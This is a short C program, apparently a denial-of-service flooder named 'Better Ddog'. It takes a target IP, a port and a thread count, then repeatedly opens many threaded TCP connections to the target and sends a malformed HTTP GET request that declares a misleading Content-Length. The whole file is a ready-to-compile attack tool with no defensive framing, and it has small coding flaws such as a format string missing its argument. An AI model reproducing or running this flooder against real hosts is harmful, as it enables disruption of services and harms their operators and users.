#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <pthread.h>

struct sockaddr_in sa;
struct timeval tv;
char *req;

void *actualspam(void *unused) {
 int fd = socket(AF_INET, SOCK_STREAM, 0);
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) { 
 send(fd, req, strlen(req), MSG_NOSIGNAL);
 close(fd);
 } else {
  close(fd);
 }
}

int makereq(char *ip) {
 req = malloc(2000); 
 sprintf(req, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla 3.0 (custom 1.0/2)\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 10000\r\n\r\n");
}

int main(int argc, char **argv) {
 printf("Better Ddog\n");
 srand(time(0));
 if(argc < 4) {
  printf("ip port threads\n"); 
  return 0;
 } 
 sa.sin_addr.s_addr = inet_addr(argv[1]);
 sa.sin_port = htons(atoi(argv[2]));
 sa.sin_family = AF_INET;
 pthread_t threads[atoi(argv[3])];
 tv.tv_sec = 1;
 makereq(argv[1]);
 while(1) {
  for(int i = 0; i < atoi(argv[3]); i++) {
   pthread_create(&threads[i], 0, &actualspam, 0); 
  }
  for(int i = 0; i < atoi(argv[3]); i++) {
   pthread_join(threads[i], 0); 
  }
 }
}
